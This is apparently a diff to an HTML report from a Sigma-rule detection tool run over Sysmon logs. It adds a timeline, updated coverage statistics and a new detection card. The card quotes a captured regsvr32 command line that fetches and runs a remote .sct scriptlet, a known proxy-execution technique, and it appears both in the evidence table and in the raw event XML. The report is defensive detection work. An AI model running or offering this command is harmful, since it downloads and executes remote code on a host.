@@ -64,6 +64,14 @@
   .chip.miss { color: var(--red); border-color: #6e2c28; }
   .footer { color: var(--muted); font-size: 12px; margin-top: 36px;
             border-top: 1px solid var(--border); padding-top: 10px; }
+  .timeline { border-left: 2px solid var(--border); margin: 12px 0 12px 6px;
+              padding-left: 18px; }
+  .trow { position: relative; margin: 10px 0; }
+  .trow::before { content: ""; position: absolute; left: -23px; top: 6px;
+                  width: 8px; height: 8px; border-radius: 50%;
+                  background: var(--border); }
+  .trow .when { font: 12px Consolas, monospace; color: var(--muted);
+                margin-right: 8px; }
 </style>
 </head>
 <body>
@@ -76,21 +84,76 @@
 
   <div class="stats">
     <div class="stat"><div class="num">6</div><div class="lbl">events scanned</div></div>
-    <div class="stat"><div class="num">2456</div><div class="lbl">rules loaded</div></div>
-    <div class="stat"><div class="num">2</div><div class="lbl">detections</div></div>
+    <div class="stat"><div class="num">2458</div><div class="lbl">rules loaded</div></div>
+    <div class="stat"><div class="num">3</div><div class="lbl">detections</div></div>
     <div class="stat"><div class="num">2</div><div class="lbl">techniques observed</div></div>
-    <div class="stat"><div class="num">306/697</div><div class="lbl">techniques covered by ruleset</div></div>
-    <div class="stat warn"><div class="num">391</div><div class="lbl">techniques with no detection rule</div></div>
+    <div class="stat"><div class="num">308/697</div><div class="lbl">techniques covered by ruleset</div></div>
+    <div class="stat warn"><div class="num">389</div><div class="lbl">techniques with no detection rule</div></div>
   </div>
 
   <div class="banner">
-    Caveats: 94 rules use unsupported Sigma grammar and were not
+    Caveats: 1 rules use unsupported Sigma grammar and were not
     evaluated; 0 rules errored and were skipped. Neither group counts
     toward coverage.
   </div>
 
   <h2>Detections by ATT&amp;CK tactic</h2>
-  <h3>stealth (2)</h3>
+  <h3>stealth (3)</h3>
+  <div class="card">
+    <div class="head">
+      <span class="badge medium">medium</span>
+      <span class="title">Potential Regsvr32 Commandline Flag Anomaly</span>
+      <span class="tech">
+T1218.010 Regsvr32      </span>
+    </div>
+    <div class="meta">
+      sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx
+ · 2019-05-13T18:03:19.681479+00:00      · rule b236190c-1c61-41e9-84b3-3fe03f6d76b0
+    </div>
+    <table class="evidence">
+      <tr><td class="k">Image</td><td>C:\Windows\System32\regsvr32.exe</td></tr>
+      <tr><td class="k">CommandLine</td><td>/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll</td></tr>
+    </table>
+    <pre class="raw">&lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&gt;&lt;System&gt;&lt;Provider Name=&#34;Microsoft-Windows-Sysmon&#34; Guid=&#34;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&#34;&gt;&lt;/Provider&gt;
+&lt;EventID Qualifiers=&#34;&#34;&gt;1&lt;/EventID&gt;
+&lt;Version&gt;5&lt;/Version&gt;
+&lt;Level&gt;4&lt;/Level&gt;
+&lt;Task&gt;1&lt;/Task&gt;
+&lt;Opcode&gt;0&lt;/Opcode&gt;
+&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;
+&lt;TimeCreated SystemTime=&#34;2019-05-13 18:03:19.681479+00:00&#34;&gt;&lt;/TimeCreated&gt;
+&lt;EventRecordID&gt;17287&lt;/EventRecordID&gt;
+&lt;Correlation ActivityID=&#34;&#34; RelatedActivityID=&#34;&#34;&gt;&lt;/Correlation&gt;
+&lt;Execution ProcessID=&#34;276&#34; ThreadID=&#34;1000&#34;&gt;&lt;/Execution&gt;
+&lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt;
+&lt;Computer&gt;IEWIN7&lt;/Computer&gt;
+&lt;Security UserID=&#34;S-1-5-18&#34;&gt;&lt;/Security&gt;
+&lt;/System&gt;
+&lt;EventData&gt;&lt;Data Name=&#34;RuleName&#34;&gt;&lt;/Data&gt;
+&lt;Data Name=&#34;UtcTime&#34;&gt;2019-05-13 18:03:19.497&lt;/Data&gt;
+&lt;Data Name=&#34;ProcessGuid&#34;&gt;{365abb72-b167-5cd9-0000-001062160c00}&lt;/Data&gt;
+&lt;Data Name=&#34;ProcessId&#34;&gt;2476&lt;/Data&gt;
+&lt;Data Name=&#34;Image&#34;&gt;C:\Windows\System32\regsvr32.exe&lt;/Data&gt;
+&lt;Data Name=&#34;FileVersion&#34;&gt;6.1.7600.16385 (win7_rtm.090713-1255)&lt;/Data&gt;
+&lt;Data Name=&#34;Description&#34;&gt;Microsoft(C) Register Server&lt;/Data&gt;
+&lt;Data Name=&#34;Product&#34;&gt;Microsoft&amp;#174; Windows&amp;#174; Operating System&lt;/Data&gt;
+&lt;Data Name=&#34;Company&#34;&gt;Microsoft Corporation&lt;/Data&gt;
+&lt;Data Name=&#34;CommandLine&#34;&gt;/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll&lt;/Data&gt;
+&lt;Data Name=&#34;CurrentDirectory&#34;&gt;C:\Windows\system32\&lt;/Data&gt;
+&lt;Data Name=&#34;User&#34;&gt;IEWIN7\IEUser&lt;/Data&gt;
+&lt;Data Name=&#34;LogonGuid&#34;&gt;{365abb72-b0ec-5cd9-0000-00201d340100}&lt;/Data&gt;
+&lt;Data Name=&#34;LogonId&#34;&gt;0x000000000001341d&lt;/Data&gt;
+&lt;Data Name=&#34;TerminalSessionId&#34;&gt;1&lt;/Data&gt;
+&lt;Data Name=&#34;IntegrityLevel&#34;&gt;Medium&lt;/Data&gt;
+&lt;Data Name=&#34;Hashes&#34;&gt;SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583&lt;/Data&gt;
+&lt;Data Name=&#34;ParentProcessGuid&#34;&gt;{365abb72-b0ec-5cd9-0000-0010d9d20000}&lt;/Data&gt;
+&lt;Data Name=&#34;ParentProcessId&#34;&gt;944&lt;/Data&gt;
+&lt;Data Name=&#34;ParentImage&#34;&gt;C:\Windows\System32\svchost.exe&lt;/Data&gt;
+&lt;Data Name=&#34;ParentCommandLine&#34;&gt;C:\Windows\system32\svchost.exe -k netsvcs&lt;/Data&gt;
+&lt;/EventData&gt;
+&lt;/Event&gt;
+</pre>
+  </div>
   <div class="card">
     <div class="head">
       <span class="badge medium">medium</span>
@@ -252,10 +315,35 @@ T1559.001 Component Object Model · T1218.010 Regsvr32      </span>
 </pre>
   </div>
 
+  <h2>Timeline</h2>
+  <div class="timeline">
+    <div class="trow">
+      <span class="when">2019-05-13T18:03:19.681479+00:00</span>
+      <span class="badge medium">medium</span>
+      Potential Regsvr32 Commandline Flag Anomaly
+      <span class="tech">
+T1218.010      </span>
+    </div>
+    <div class="trow">
+      <span class="when">2019-05-13T18:03:19.681479+00:00</span>
+      <span class="badge medium">medium</span>
+      Potentially Suspicious Regsvr32 HTTP/FTP Pattern
+      <span class="tech">
+T1218.010      </span>
+    </div>
+    <div class="trow">
+      <span class="when">2019-05-13T18:03:21.212896+00:00</span>
+      <span class="badge medium">medium</span>
+      Network Connection Initiated By Regsvr32.EXE
+      <span class="tech">
+T1559.001, T1218.010      </span>
+    </div>
+  </div>
+
   <h2>ATT&amp;CK coverage of the loaded ruleset</h2>
   <p>
-    The ruleset references <strong>306 of 697</strong>
-    enterprise techniques. <strong style="color: var(--red)">391 techniques have
+    The ruleset references <strong>308 of 697</strong>
+    enterprise techniques. <strong style="color: var(--red)">389 techniques have
     no detection rule at all.</strong> A green chip below means at least one rule is tagged to the
     technique, which is not the same as saying the activity would be detected.
   </p>
@@ -281,8 +369,8 @@ T1559.001 Component Object Model · T1218.010 Regsvr32      </span>
   </div>
   <div class="tactic-row">
     <div>discovery</div>
-    <div class="bar"><div class="fill" style="width: 63.0%"></div></div>
-    <div class="nums">31 / 49</div>
+    <div class="bar"><div class="fill" style="width: 67.0%"></div></div>
+    <div class="nums">33 / 49</div>
   </div>
   <div class="tactic-row">
     <div>execution</div>
@@ -564,6 +652,7 @@ T1559.001 Component Object Model · T1218.010 Regsvr32      </span>
       <span class="chip ok" title="Application Window Discovery: 1 rule(s)">T1010</span>
       <span class="chip ok" title="Query Registry: 9 rule(s)">T1012</span>
       <span class="chip ok" title="System Network Configuration Discovery: 5 rule(s)">T1016</span>
+      <span class="chip ok" title="Wi-Fi Discovery: 1 rule(s)">T1016.002</span>
       <span class="chip ok" title="Remote System Discovery: 13 rule(s)">T1018</span>
       <span class="chip ok" title="System Owner/User Discovery: 20 rule(s)">T1033</span>
       <span class="chip ok" title="Network Sniffing: 6 rule(s)">T1040</span>
@@ -588,11 +677,11 @@ T1559.001 Component Object Model · T1218.010 Regsvr32      </span>
       <span class="chip ok" title="Software Discovery: 4 rule(s)">T1518</span>
       <span class="chip ok" title="Security Software Discovery: 3 rule(s)">T1518.001</span>
       <span class="chip ok" title="Cloud Service Discovery: 1 rule(s)">T1526</span>
+      <span class="chip ok" title="System Location Discovery: 1 rule(s)">T1614</span>
       <span class="chip ok" title="System Language Discovery: 2 rule(s)">T1614.001</span>
       <span class="chip ok" title="Group Policy Discovery: 5 rule(s)">T1615</span>
       <span class="chip ok" title="Debugger Evasion: 1 rule(s)">T1622</span>
       <span class="chip miss" title="Internet Connection Discovery: no rules">T1016.001</span>
-      <span class="chip miss" title="Wi-Fi Discovery: no rules">T1016.002</span>
       <span class="chip miss" title="Cloud Groups: no rules">T1069.003</span>
       <span class="chip miss" title="Email Account: no rules">T1087.003</span>
       <span class="chip miss" title="Cloud Account: no rules">T1087.004</span>
@@ -603,7 +692,6 @@ T1559.001 Component Object Model · T1218.010 Regsvr32      </span>
       <span class="chip miss" title="Cloud Service Dashboard: no rules">T1538</span>
       <span class="chip miss" title="Cloud Infrastructure Discovery: no rules">T1580</span>
       <span class="chip miss" title="Container and Resource Discovery: no rules">T1613</span>
-      <span class="chip miss" title="System Location Discovery: no rules">T1614</span>
       <span class="chip miss" title="Cloud Storage Object Discovery: no rules">T1619</span>
       <span class="chip miss" title="Device Driver Discovery: no rules">T1652</span>
       <span class="chip miss" title="Log Enumeration: no rules">T1654</span>
